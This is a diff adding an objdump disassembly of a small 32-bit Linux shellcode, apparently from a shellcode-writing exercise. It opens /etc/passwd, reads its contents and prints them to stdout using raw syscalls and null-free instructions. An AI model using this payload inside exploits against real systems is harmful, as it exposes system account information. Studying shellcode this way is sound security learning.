@@ -1,0 +1,34 @@
+
+cat_etc_passwd.elf:     format de fichier elf32-i386
+
+
+Déassemblage de la section .text :
+
+08049000 <_start>:
+ 8049000:	31 c0                	xor    eax,eax
+ 8049002:	50                   	push   eax
+ 8049003:	b0 05                	mov    al,0x5
+ 8049005:	68 73 73 77 64       	push   0x64777373
+ 804900a:	68 2f 2f 70 61       	push   0x61702f2f
+ 804900f:	68 2f 65 74 63       	push   0x6374652f
+ 8049014:	89 e3                	mov    ebx,esp
+ 8049016:	31 c9                	xor    ecx,ecx
+ 8049018:	31 d2                	xor    edx,edx
+ 804901a:	cd 80                	int    0x80
+ 804901c:	93                   	xchg   ebx,eax
+ 804901d:	31 c0                	xor    eax,eax
+ 804901f:	b0 03                	mov    al,0x3
+ 8049021:	8d 0c 24             	lea    ecx,[esp]
+ 8049024:	31 d2                	xor    edx,edx
+ 8049026:	66 83 c2 ff          	add    dx,0xffff
+ 804902a:	cd 80                	int    0x80
+ 804902c:	92                   	xchg   edx,eax
+ 804902d:	31 c0                	xor    eax,eax
+ 804902f:	b0 04                	mov    al,0x4
+ 8049031:	31 db                	xor    ebx,ebx
+ 8049033:	b3 01                	mov    bl,0x1
+ 8049035:	cd 80                	int    0x80
+ 8049037:	31 c0                	xor    eax,eax
+ 8049039:	b0 01                	mov    al,0x1
+ 804903b:	31 db                	xor    ebx,ebx
+ 804903d:	cd 80                	int    0x80
